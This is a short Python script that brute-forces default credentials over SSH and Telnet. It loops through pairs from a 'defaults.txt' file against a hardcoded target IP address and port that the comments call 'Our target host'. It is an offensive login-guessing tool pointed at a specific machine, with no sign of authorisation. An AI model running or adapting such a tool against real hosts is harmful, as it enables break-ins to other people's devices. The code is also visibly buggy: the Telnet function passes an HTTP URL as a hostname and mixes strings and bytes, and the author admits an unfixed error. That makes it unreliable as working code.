"""
USE SSH & TELNET TO TEST FOR DEFAULT LOGIN CREDS
TODO: FIX ERROR
"""
import paramiko  # SSH lib
import telnetlib


def sshlogin(host, port, username, password):
    try: 
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())  # Ignores us because/if we have no server key
        ssh.connect(host, port=port, username=username, password=password)  # Attempt login to host:port using combo
        ssh_session = ssh.get_transport().open_session()  # Attempt to open session
        if ssh_session.active:  # Test for active session
            print("Login successful on %s:%s with username %s and password %s" % (host, port, username, password))
    except:  # Catch exceptions
            print("Login failed %s %s" % (username, password))
    ssh.close()  # Close SSH after test


def telnetlogin(host, port, username, password):  # Telnet is popular with IOT devices
    h = "http://" + host + ":" + port + "/"
    tn = telnetlib.Telnet(h)  # Set up telnet connection on ip:host
    tn.read_until("login: ")  # Read until will look for login prompt on host:port
    tn.write(username + "\n")  # Enter username
    tn.read_until("Password: ")
    tn.write(password + "\n")
    try:
        result = tn.expect(["Last login"])  # Check for successful login
        if (result[0] > 0):  # If connection succeeded
            print("Telnet login successful on %s:%s with username %s and password %s" % (host,port,username,password))
        tn.close()
    except EOFError:  # End of file error
        print("Login failed %s %s" % (username, password))


host = "41.84.143.118"  # Our target host
port = "5984"
with open("defaults.txt", "r") as f:  # List of default credentials goes here
    for line in f:
        vals = line.split()
        username = vals[0].strip()  # Pull username-pass pair
        password = vals[1].strip()
        sshlogin(host, port, username, password)  # For each combo, try login on host and port provided
        telnetlogin(host, port, username, password)
